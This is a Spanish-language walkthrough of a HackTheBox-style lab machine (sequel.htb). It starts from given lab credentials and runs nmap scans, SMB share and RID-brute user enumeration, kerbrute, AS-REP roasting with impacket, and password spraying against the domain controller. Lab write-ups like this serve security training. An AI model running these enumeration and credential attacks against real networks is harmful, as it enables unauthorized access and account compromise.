Antes de empezar la maquina se nos sumistran unas credenciales
```ad-info
 rose::KxEPkKe6R8su
```
# Enumeración

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.232.128 -oG allPorts
```

```shell
 [*] IP Address: 10.129.232.128
 [*] Open ports: 53,88,135,139,389,445,464,636,1433,3268,5985,9389,47001,49664,49665,49666,49667,49693,49694,49695,49710,49726,49735,49810
```

```shell
nmap -p53,88,135,139,389,445,464,636,1433,3268,5985,9389,47001,49664,49665,49666,49667,49693,49694,49695,49710,49726,49735,49810 -sCV 10.129.232.128 -oN targeted
```



## Enumeración del SMB

```shell
nxc smb 10.129.232.128
```

Añadimos al `/etc/hosts` la IP y el dominio `10.129.232.128  sequel.htb dc01 dc01.sequel.htb`

### Verificamos si el usuario es valido

```shell
nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su'
```

### Enumeramos los recursos compartidos en red

```shell
nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --shares
```

```shell
Share           Permissions     Remark
-----           -----------     ------
Accounting Department READ            
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 
Users           READ            
```

### Enumeración de usuarios existentes

 
```shell
nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --rid-brute  | grep "SidTypeUser" | awk '{print $6}' | cut -d '\' -f2-2 | tee users.txt
```


### Enumeración de usuarios validos

```shell
kerbrute userenum --dc 10.129.232.128 -d sequel.htb users.txt
```


# Explotación
## AS-REP Roasting Attack

```shell
impacket-GetNPUsers -no-pass -usersfile users.txt sequel.htb/
```

## Password spraying

```shell
nxc smb 10.129.232.128 -u users.txt -p 'KxEPkKe6R8su' 
```


## User as Password

```shell
nxc smb 10.129.232.128 -u users.txt -p users.txt --no-bruteforce
```

